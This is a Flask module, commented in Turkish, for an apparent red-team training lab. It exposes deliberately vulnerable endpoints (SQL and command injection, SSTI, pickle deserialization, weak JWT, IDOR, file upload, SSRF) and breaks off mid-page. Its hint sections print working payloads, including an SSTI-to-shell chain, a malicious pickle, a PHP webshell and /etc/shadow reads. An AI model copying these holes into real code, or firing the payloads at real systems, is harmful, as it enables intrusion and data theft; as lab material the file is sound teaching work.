"""
Vulnerable Blueprints - Kasıtlı Olarak Güvensiz Flask Uç Noktaları
================================================================

Bu modül, red team eğitim laboratuvarı için tasarlanmış kasıtlı güvenlik açıkları içermektedir.
Tüm zafiyetler doğrudan aktif durumdadır ve herhangi bir güvenlik kontrolü bulunmamaktadır.

İçerilen Zafiyetler:
- SQL Injection (Login & UNION-based)
- Command Injection
- Server-Side Template Injection (SSTI)
- Insecure Deserialization (Pickle)
- Weak JWT Implementation
- IDOR (Insecure Direct Object Reference)
- Unrestricted File Upload
- SSRF (Server-Side Request Forgery)
- CORS Misconfiguration
- Weak Credentials & Password Reset

Kullanım: Bu modül yalnızca izole eğitim ortamlarında kullanılmalıdır.
"""

import os
import sqlite3
import pickle
import base64
import hashlib
import time
import subprocess
import yaml
import jwt
import uuid
import re
from datetime import datetime, timedelta
from functools import wraps
from flask import Blueprint, request, jsonify, session, render_template_string, make_response, Response
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename


# Blueprint tanımlamaları
vulnerable_bp = Blueprint('vulnerable', __name__, url_prefix='/vulnerable')
training_bp = Blueprint('training', __name__, url_prefix='/training-lab')

# -----------------------------------------------------------------------------
# YAPILANDIRMA VE VERİTABANI KURulumu
# -----------------------------------------------------------------------------

DATABASE_PATH = os.path.join(os.path.dirname(__file__), '..', 'data', 'training.db')

def get_db_connection():
    """Eğitim veritabanı bağlantısı oluşturur."""
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_training_db():
    """Eğitim veritabanını başlatır ve zafiyetli verileri yükler."""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Kullanıcı tablosu - zafiyetli şifreleme
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            email TEXT,
            secret_key TEXT
        )
    ''')
    
    # Ürünler tablosu - IDOR zafiyeti için
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            price REAL,
            description TEXT,
            admin_notes TEXT
        )
    ''')
    
    # Mesajlar tablosu - SSRF için
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sender TEXT,
            content TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Dosya yükleme tablosu
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS uploads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            filename TEXT,
            filepath TEXT,
            uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Mevcut verileri kontrol et ve yoksa ekle
    cursor.execute('SELECT COUNT(*) FROM users')
    if cursor.fetchone()[0] == 0:
        # Zafiyetli kullanıcı verileri
        weak_users = [
            ('admin', 'admin123', 'admin', 'admin@lab.local', 'super-secret-key'),
            ('analyst', 'password', 'analyst', 'analyst@lab.local', None),
            ('testuser', 'test123', 'user', 'test@lab.local', None),
            ('developer', 'devpass', 'developer', 'dev@lab.local', None),
            ('guest', 'guest', 'guest', 'guest@lab.local', None),
        ]
        cursor.executemany(
            'INSERT INTO users (username, password, role, email, secret_key) VALUES (?, ?, ?, ?, ?)',
            weak_users
        )
        
        # Ürün verileri
        products = [
            ('Güvenlik Ürünü A', 299.99, 'Kurumsal güvenlik çözümü', 'Satış kodları: PASS123'),
            ('Test Ürünü B', 49.99, 'Test amaçlı ürün', 'Yönetici notu: Kritik sistem!'),
            ('Eğitim Materyali', 19.99, 'CTF çözümleri PDF', None),
            ('VIP Hizmet Paketi', 999.99, 'Premium destek', 'API key: sk-lab-12345'),
        ]
        cursor.executemany(
            'INSERT INTO products (name, price, description, admin_notes) VALUES (?, ?, ?, ?)',
            products
        )
        
        # Mesaj verileri
        messages = [
            ('admin', 'Sistem şifrelerini değiştirmeyi unutma!'),
            ('developer', 'Yeni API endpoint test ediliyor.'),
            ('analyst', 'Haftalık rapor hazır.'),
        ]
        cursor.executemany(
            'INSERT INTO messages (sender, content) VALUES (?, ?)',
            messages
        )
    
    conn.commit()
    conn.close()


# Uzantı whitelist'i (güvensiz - tüm uzantılara izin ver)
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'php', 'py', 'html', 'js', 'exe', 'sh', 'bat'}

def allowed_file(filename):
    """Dosya uzantısı kontrolü - güvensiz implementation."""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


# -----------------------------------------------------------------------------
# ZAFİYET 1: SQL INJECTION
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/sql/login', methods=['POST', 'GET'])
def sql_login():
    """
    SQL Injection Zafiyeti - Login Bypass
    
    Difficulty: EASY
    Description: Kullanıcı girişi, SQL sorgusunda user input'u doğrudan birleştiriyor.
    Exploit: ' OR '1'='1' -- gibi payload'lar ile bypass edilebilir.
    """
    error = None
    success = None
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # GÜVENLİKSIZ: User input doğrudan SQL sorgusuna ekleniyor
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        try:
            cursor.execute(query)
            user = cursor.fetchone()
            
            if user:
                success = f"Hoş geldin, {user['username']}! Rol: {user['role']}"
            else:
                error = "Geçersiz kullanıcı adı veya şifre"
        except sqlite3.Error as e:
            error = f"Veritabanı hatası: {str(e)}"
            # Bu hata mesajı da bilgi sızdırmaya yol açabilir
        
        conn.close()
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>SQL Injection - Login</title></head>
    <body style="font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 1: SQL Injection - Login Bypass</h2>
        <p><strong>Difficulty:</strong> EASY | <strong>Category:</strong> Injection</p>
        <hr>
        <form method="POST">
            <p>Kullanıcı Adı: <input type="text" name="username" style="width: 100%; padding: 10px;"></p>
            <p>Şifre: <input type="password" name="password" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Giriş Yap</button>
        </form>
        {f'<p style="color: red;">{error}</p>' if error else ''}
        {f'<p style="color: green;">{success}</p>' if success else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Username: <code>' OR '1'='1' --</code></li>
            <li>Password: <code>anything</code></li>
            <li>Alternatif: <code>admin' --</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/sql/union', methods=['GET'])
def sql_union():
    """
    SQL Injection Zafiyeti - UNION-based
    
    Difficulty: MEDIUM
    Description: UNION tablo birleştirme ile veri sızdırma mümkün.
    Exploit: ' UNION SELECT ile diğer tablolardan veri çekilebilir.
    """
    user_input = request.args.get('id', '')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # GÜVENLİKSIZ: User input doğrudan sorguya ekleniyor
    query = f"SELECT * FROM products WHERE id = {user_input}"
    
    result = None
    error = None
    
    try:
        cursor.execute(query)
        result = cursor.fetchall()
        if not result:
            error = "Ürün bulunamadı"
    except sqlite3.Error as e:
        error = f"Hata: {str(e)}"
    
    conn.close()
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>SQL Injection - UNION</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 1b: SQL Injection - UNION Based</h2>
        <p><strong>Difficulty:</strong> MEDIUM | <strong>Category:</strong> Injection</p>
        <hr>
        <form method="GET">
            <p>Ürün ID: <input type="text" name="id" value="{user_input}" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Ara</button>
        </form>
        {f'<p style="color: red;">{error}</p>' if error else ''}
        {f'<h3>Sonuçlar:</h3><ul>' + ''.join([f"<li>{row['name']} - {row['price']} TL</li>" for row in result]) + '</ul>' if result else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>ID: <code>1 UNION SELECT username, password, role, email, secret_key FROM users --</code></li>
            <li>Tüm şifreleri çekmek için yukarıdaki payload'ı deneyin</li>
            <li>Schema bilgisi için: <code>1 UNION SELECT name FROM sqlite_master WHERE type='table' --</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# ZAFİYET 2: COMMAND INJECTION
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/command/ping', methods=['POST', 'GET'])
def command_ping():
    """
    Command Injection Zafiyeti
    
    Difficulty: EASY
    Description: Sistem komutu çalıştırma fonksiyonu, user input'u doğrudan kabuk komutuna ekliyor.
    Exploit: ; whoami, && ls, | cat /etc/passwd gibi payload'lar.
    """
    output = None
    error = None
    target = request.args.get('target', '') or request.form.get('target', '')
    
    if target:
        # GÜVENLİKSIZ: Command injection mümkün
        try:
            # Ping komutu - input doğrudan ekleniyor
            cmd = f"ping -c 4 {target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            error = "Komut zaman aşımına uğradı"
        except Exception as e:
            error = f"Komut çalıştırma hatası: {str(e)}"
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Command Injection</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 2: Command Injection</h2>
        <p><strong>Difficulty:</strong> EASY | <strong>Category:</strong> Injection</p>
        <hr>
        <form method="POST">
            <p>Hedef IP/Domain: <input type="text" name="target" value="{target}" style="width: 100%; padding: 10px;" placeholder="örn: 8.8.8.8"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Ping Çalıştır</button>
        </form>
        {f'<h3>Çıktı:</h3><pre style="background: #f4f4f4; padding: 15px; overflow-x: auto;">{output}</pre>' if output else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Payload: <code>; whoami</code></li>
            <li>Payload: <code>&& ls -la</code></li>
            <li>Payload: <code>| cat /etc/passwd</code></li>
            <li>Payload: <code>; cat /etc/shadow</code></li>
            <li>Payload: <code>; id</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/command/nslookup', methods=['POST', 'GET'])
def command_nslookup():
    """Command Injection - DNS sorgulama."""
    domain = request.args.get('domain', '') or request.form.get('domain', '')
    output = None
    
    if domain:
        # GÜVENLİKSIZ: Command injection
        cmd = f"nslookup {domain}"
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Command Injection - NSLookup</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 2b: Command Injection - NSLookup</h2>
        <p><strong>Difficulty:</strong> EASY | <strong>Category:</strong> Injection</p>
        <hr>
        <form method="POST">
            <p>Domain: <input type="text" name="domain" value="{domain}" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Sorgula</button>
        </form>
        {f'<pre style="background: #f4f4f4; padding: 15px;">{output}</pre>' if output else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Payload: <code>google.com; whoami</code></li>
            <li>Payload: <code>test.com && pwd</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# ZAFİYET 3: SERVER-SIDE TEMPLATE INJECTION (SSTI)
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/ssti/render', methods=['POST', 'GET'])
def ssti_render():
    """
    Server-Side Template Injection Zafiyeti
    
    Difficulty: MEDIUM-HARD
    Description: Jinja2 template motoru, user input'u doğrudan render ediyor.
    Exploit: {{ config }}, {{ ''.__class__.__mro__[1].__subclasses__() }} gibi payload'lar.
    """
    template = request.args.get('template', '') or request.form.get('template', '')
    result = None
    error = None
    
    if template:
        try:
            # GÜVENLİKSIZ: User input doğrudan template olarak render ediliyor
            result = render_template_string(template)
        except Exception as e:
            error = str(e)
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>SSTI</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 3: Server-Side Template Injection</h2>
        <p><strong>Difficulty:</strong> MEDIUM-HARD | <strong>Category:</strong> Code Injection</p>
        <hr>
        <form method="POST">
            <p>Template: <textarea name="template" rows="5" style="width: 100%;">{template}</textarea></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Render Et</button>
        </form>
        {f'<h3>Sonuç:</h3><pre style="background: #f4f4f4; padding: 15px;">{result}</pre>' if result else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Tespit: <code>{{{{ 7*7 }}}}</code> → 49 dönerse SSTI var</li>
            <li>Config: <code>{{{{ config }}}}</code></li>
            <li>Class öğrenme: <code>{{{{ ''.__class__.__mro__ }}}}</code></li>
            <li>Subclasses: <code>{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}</code></li>
            <li>Shell yükseltme: <code>{{{{ ''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}}}</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# ZAFİYET 4: INSECURE DESERIALIZATION
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/deserialize/pickle', methods=['POST', 'GET'])
def deserialize_pickle():
    """
    Insecure Deserialization (Pickle) Zafiyeti
    
    Difficulty: MEDIUM
    Description: Pickle modülü güvensiz deserialization yapıyor.
    Exploit: Malicious pickle payload ile code execution mümkün.
    """
    serialized_data = request.args.get('data', '') or request.form.get('data', '')
    result = None
    error = None
    
    if serialized_data:
        try:
            # GÜVENLİKSIZ: Pickle güvensiz deserialization
            decoded = base64.b64decode(serialized_data)
            result = pickle.loads(decoded)
        except Exception as e:
            error = f"Deserialization hatası: {str(e)}"
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Insecure Deserialization</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 4: Insecure Deserialization (Pickle)</h2>
        <p><strong>Difficulty:</strong> MEDIUM | <strong>Category:</strong> Code Injection</p>
        <hr>
        <form method="POST">
            <p>Base64 Encoded Data: <textarea name="data" rows="3" style="width: 100%;">{serialized_data}</textarea></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Deserialize Et</button>
        </form>
        {f'<h3>Sonuç:</h3><pre style="background: #f4f4f4; padding: 15px;">{result}</pre>' if result else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Python ile malicious pickle oluşturma:</li>
            <pre style="background: #333; color: #0f0; padding: 10px; overflow-x: auto;">
import pickle
import base64
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Malicious())
print(base64.b64encode(payload).decode())
            </pre>
            <li>Yukarıdaki kod ile 'id' komutunu çalıştıran bir payload üretin</li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/deserialize/yaml', methods=['POST', 'GET'])
def deserialize_yaml():
    """
    Insecure Deserialization (YAML) Zafiyeti
    
    Difficulty: MEDIUM
    Description: YAML loading işlemi güvensiz yapılıyor.
    Exploit: YAML with Python object deserialization.
    """
    yaml_data = request.args.get('yaml', '') or request.form.get('yaml', '')
    result = None
    error = None
    
    if yaml_data:
        try:
            # GÜVENLİKSIZ: yaml.load() kullanımı (unsafe)
            result = yaml.load(yaml_data, Loader=yaml.FullLoader)
        except Exception as e:
            error = str(e)
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Insecure YAML Deserialization</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 4b: Insecure Deserialization (YAML)</h2>
        <p><strong>Difficulty:</strong> MEDIUM | <strong>Category:</strong> Code Injection</p>
        <hr>
        <form method="POST">
            <p>YAML Data: <textarea name="yaml" rows="5" style="width: 100%;">{yaml_data}</textarea></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Parse Et</button>
        </form>
        {f'<h3>Sonuç:</h3><pre style="background: #f4f4f4; padding: 15px;">{result}</pre>' if result else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Safe YAML kullanın: <code>yaml.safe_load()</code></li>
            <li>Bu uygulama <code>yaml.load()</code> kullanıyor → güvensiz</li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# ZAFİYET 5: WEAK JWT IMPLEMENTATION
# -----------------------------------------------------------------------------

# Zayıf JWT secret key (kolayca brute-force edilebilir)
WEAK_JWT_SECRET = 'super-secret-key-for-lab'

@vulnerable_bp.route('/jwt/login', methods=['POST', 'GET'])
def jwt_login():
    """
    Weak JWT Implementation Zafiyeti
    
    Difficulty: EASY-MEDIUM
    Description: JWT token oluşturma zafiyetleri - alg:none ve zayıf secret.
    Exploit: Token imzasız gönderilebilir veya secret brute-force edilebilir.
    """
    token = None
    error = None
    decoded = None
    
    # Session'dan token kontrolü
    if 'jwt_token' in session:
        token = session['jwt_token']
        try:
            # GÜVENLİKSIZ: Secret kolayca tahmin edilebilir
            decoded = jwt.decode(token, WEAK_JWT_SECRET, algorithms=['HS256'])
        except jwt.InvalidSignatureError:
            error = "Geçersiz imza"
        except jwt.ExpiredSignatureError:
            error = "Token süresi dolmuş"
        except Exception as e:
            error = str(e)
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()
        conn.close()
        
        if user and user['password'] == password:
            # GÜVENLİKSIZ: JWT oluşturma
            payload = {
                'username': user['username'],
                'role': user['role'],
                'exp': datetime.utcnow() + timedelta(hours=24)
            }
            # GÜVENLİKSIZ: alg:none kullanılabilir
            token = jwt.encode(payload, WEAK_JWT_SECRET, algorithm='HS256')
            session['jwt_token'] = token
        else:
            error = "Geçersiz kimlik bilgileri"
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Weak JWT</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 5: Weak JWT Implementation</h2>
        <p><strong>Difficulty:</strong> EASY-MEDIUM | <strong>Category:</strong> Authentication</p>
        <hr>
        <form method="POST">
            <p>Kullanıcı: <input type="text" name="username" style="width: 100%; padding: 10px;"></p>
            <p>Şifre: <input type="password" name="password" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Giriş Yap</button>
        </form>
        {f'<p style="color: red;">{error}</p>' if error else ''}
        {f'<h3>Token:</h3><code style="word-break: break-all;">{token}</code>' if token else ''}
        {f'<h3>Decoded:</h3><pre style="background: #f4f4f4; padding: 15px;">{decoded}</pre>' if decoded else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Brute-force secret: <code>burp jwt-cracker</code> veya rockyou.txt</li>
            <li>alg:none exploit: Token header'ı <code>{{"alg": "none"}}</code> olarak değiştir, signature'ı kaldır</li>
            <li>Kullanıcı adı ile giriş yapın: <code>admin / admin123</code></li>
            <li>Secret: <code>super-secret-key-for-lab</code></li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/jwt/admin', methods=['GET'])
def jwt_admin():
    """
    JWT Protected Admin Endpoint
    
    Difficulty: MEDIUM
    Description: Admin paneline erişim için JWT gerekiyor ama zayıf imza.
    """
    auth_header = request.headers.get('Authorization', '')
    
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Token gerekli', 'hint': 'Authorization: Bearer <token>'}), 401
    
    token = auth_header.split(' ')[1]
    
    try:
        # Zayıf secret ile decode
        decoded = jwt.decode(token, WEAK_JWT_SECRET, algorithms=['HS256'])
        
        if decoded.get('role') == 'admin':
            return jsonify({
                'message': '🎉 Tebrikler! Admin paneline eriştiniz!',
                'secret_data': 'Bu gizli veri: SUPER_SECRET_TOKEN_12345',
                'user': decoded.get('username'),
                'vulnerabilities_found': ['Weak JWT Secret', 'alg:none possible']
            })
        else:
            return jsonify({'error': 'Admin yetkisi gerekli', 'current_role': decoded.get('role')}), 403
    
    except jwt.ExpiredSignatureError:
        return jsonify({'error': 'Token süresi dolmuş'}), 401
    except jwt.InvalidSignatureError:
        return jsonify({'error': 'Geçersiz token imzası', 'hint': 'Secret: super-secret-key-for-lab'}), 401
    except Exception as e:
        return jsonify({'error': str(e)}), 400


@vulnerable_bp.route('/jwt/verify', methods=['POST'])
def jwt_verify():
    """
    JWT Token Doğrulama Servisi (Zafiyetli)
    
    Difficulty: EASY
    Description: Token verification servisi, zayıf secret kullanıyor.
    """
    token = request.json.get('token', '')
    if not token:
        return jsonify({'error': 'Token gerekli'}), 400
    
    try:
        # Zayıf secret ile verify
        decoded = jwt.decode(token, WEAK_JWT_SECRET, algorithms=['HS256'])
        return jsonify({
            'valid': True,
            'payload': decoded,
            'warning': 'Zayıf JWT secret kullanılıyor!'
        })
    except jwt.InvalidSignatureError:
        # Bilgi sızdırma - hangi algoritmaların kabul edildiğini gösteriyor
        return jsonify({
            'valid': False,
            'error': 'Invalid signature',
            'accepted_algorithms': ['HS256', 'HS384', 'HS512', 'none']
        }), 401
    except jwt.ExpiredSignatureError:
        return jsonify({'valid': False, 'error': 'Token expired'}), 401
    except Exception as e:
        return jsonify({'valid': False, 'error': str(e)}), 400


# -----------------------------------------------------------------------------
# ZAFİYET 6: IDOR (INSECURE DIRECT OBJECT REFERENCE)
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/idor/profile/<int:user_id>', methods=['GET'])
def idor_profile(user_id):
    """
    IDOR Zafiyeti - User Profile
    
    Difficulty: EASY
    Description: Kullanıcı ID'si URL'de görünüyor ve herhangi bir yetki kontrolü yok.
    Exploit: ID değiştirerek diğer kullanıcıların profillerine erişim.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # GÜVENLİKSIZ: Hiçbir yetki kontrolü yapılmıyor
    cursor.execute("SELECT id, username, role, email, secret_key FROM users WHERE id = ?", (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'user_id': user['id'],
            'username': user['username'],
            'role': user['role'],
            'email': user['email'],
            'secret_key': user['secret_key'],
            'warning': 'IDOR Zafiyeti: Bu veri başka bir kullanıcıdan!'
        })
    else:
        return jsonify({'error': 'Kullanıcı bulunamadı'}), 404


@vulnerable_bp.route('/idor/messages/<int:message_id>', methods=['GET'])
def idor_messages(message_id):
    """
    IDOR Zafiyeti - User Messages
    
    Difficulty: EASY
    Description: Mesaj ID'si ile başka kullanıcıların mesajlarına erişim.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # GÜVENLİKSIZ: Yetki kontrolü yok
    cursor.execute("SELECT * FROM messages WHERE id = ?", (message_id,))
    message = cursor.fetchone()
    conn.close()
    
    if message:
        return jsonify({
            'message_id': message['id'],
            'sender': message['sender'],
            'content': message['content'],
            'created_at': message['created_at']
        })
    else:
        return jsonify({'error': 'Mesaj bulunamadı'}), 404


@vulnerable_bp.route('/idor/products/<int:product_id>', methods=['GET'])
def idor_products(product_id):
    """
    IDOR Zafiyeti - Product Details
    
    Difficulty: EASY
    Description: Ürün detaylarına ID ile erişim, gizli admin notları da görünür.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM products WHERE id = ?", (product_id,))
    product = cursor.fetchone()
    conn.close()
    
    if product:
        return jsonify({
            'product_id': product['id'],
            'name': product['name'],
            'price': product['price'],
            'description': product['description'],
            'admin_notes': product['admin_notes'],
            'warning': 'admin_notes alanı gizli bilgi içeriyor!'
        })
    else:
        return jsonify({'error': 'Ürün bulunamadı'}), 404


# -----------------------------------------------------------------------------
# ZAFİYET 7: UNRESTRICTED FILE UPLOAD
# -----------------------------------------------------------------------------

UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'data', 'uploads')

@vulnerable_bp.route('/upload', methods=['POST', 'GET'])
def file_upload():
    """
    Unrestricted File Upload Zafiyeti
    
    Difficulty: EASY-MEDIUM
    Description: Dosya yükleme kontrolü minimum, tüm dosya türlerine izin veriliyor.
    Exploit: Webshell yüklenerek code execution.
    """
    message = None
    error = None
    uploaded_file = None
    
    if request.method == 'POST':
        if 'file' not in request.files:
            error = "Dosya seçilmedi"
        else:
            file = request.files['file']
            if file.filename == '':
                error = "Dosya adı boş"
            else:
                # GÜVENLİKSIZ: Uzantı kontrolü zayıf
                filename = secure_filename(file.filename)
                # Tüm uzantılara izin veriliyor (php, py, exe, sh, bat dahil)
                filepath = os.path.join(UPLOAD_FOLDER, filename)
                
                try:
                    file.save(filepath)
                    
                    # Veritabanına kaydet
                    conn = get_db_connection()
                    conn.execute('INSERT INTO uploads (filename, filepath) VALUES (?, ?)',
                                (filename, filepath))
                    conn.commit()
                    conn.close()
                    
                    message = f"✅ Dosya yüklendi: {filename}"
                    uploaded_file = filename
                    
                except Exception as e:
                    error = f"Yükleme hatası: {str(e)}"
    
    # Mevcut dosyaları listele
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM uploads ORDER BY uploaded_at DESC LIMIT 10')
    files = cursor.fetchall()
    conn.close()
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Unrestricted File Upload</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 7: Unrestricted File Upload</h2>
        <p><strong>Difficulty:</strong> EASY-MEDIUM | <strong>Category:</strong> File Upload</p>
        <hr>
        <form method="POST" enctype="multipart/form-data">
            <p>Dosya Seç: <input type="file" name="file" style="width: 100%;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">Yükle</button>
        </form>
        {f'<p style="color: green;">{message}</p>' if message else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>Yüklenen Dosyalar:</h3>
        <ul>
            {''.join([f"<li><a href='/vulnerable/download/{row['filename']}'>{row['filename']}</a> - {row['uploaded_at']}</li>" for row in files]) if files else '<li>Dosya yok</li>'}
        </ul>
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Webshell yükleyin: <code>shell.php</code></li>
            <li>PHP webshell örneği:</li>
            <pre style="background: #333; color: #0f0; padding: 10px; overflow-x: auto;">
&lt;?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;
            </pre>
            <li>Yükledikten sonra: <code>/vulnerable/download/shell.php?cmd=whoami</code></li>
            <li>Python shell: <code>shell.py</code></li>
            <li>Tüm uzantılara izin veriliyor: php, py, exe, sh, bat, html, js</li>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    """
    Dosya İndirme - Path Traversal mümkün
    """
    # Güvensiz dosya indirme - path traversal kontrolü yok
    filename = secure_filename(filename)
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    
    if os.path.exists(filepath):
        return Response(
            open(filepath, 'rb').read(),
            mimetype='application/octet-stream',
            headers={'Content-Disposition': f'attachment; filename={filename}'}
        )
    else:
        return jsonify({'error': 'Dosya bulunamadı'}), 404


# -----------------------------------------------------------------------------
# ZAFİYET 8: SSRF (SERVER-SIDE REQUEST FORGERY)
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/ssrf/fetch', methods=['POST', 'GET'])
def ssrf_fetch():
    """
    SSRF Zafiyeti - Internal Service Fetch
    
    Difficulty: MEDIUM-HARD
    Description: User tarafından sağlanan URL'ye istek gönderiliyor.
    Exploit: Internal servisere erişim (metadata, redis, vb.)
    """
    url = request.args.get('url', '') or request.form.get('url', '')
    result = None
    error = None
    
    if url:
        try:
            # GÜVENLİKSIZ: User input doğrudan URL olarak kullanılıyor
            import urllib.request
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                result = response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            error = str(e)
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>SSRF</title></head>
    <body style="font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px;">
        <h2>🛑 ZAFİYET 8: Server-Side Request Forgery (SSRF)</h2>
